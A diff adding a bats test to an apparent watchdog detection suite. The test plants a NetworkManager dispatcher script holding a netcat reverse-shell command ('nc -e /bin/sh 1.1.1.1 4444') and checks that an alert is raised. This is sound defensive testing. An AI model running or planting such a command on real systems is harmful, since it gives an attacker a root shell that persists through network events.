@@ -259,3 +259,21 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in network-dispatcher script: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. NetworkManager dispatcher scripts run
+    # AS ROOT on every network state change (up/down/dhcp4-change/
+    # pre-up/pre-down/etc.) — a recurring trigger that fires
+    # multiple times per network blip. Sister-vector to dhcpcd-
+    # hooks/dhclient-hooks/resolvconf-hooks on the network-event
+    # family. Closes the netcat axis on the network-dispatcher
+    # surface (T1546 — Event Triggered Execution via network state
+    # change).
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${DISPD}/99-evil"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
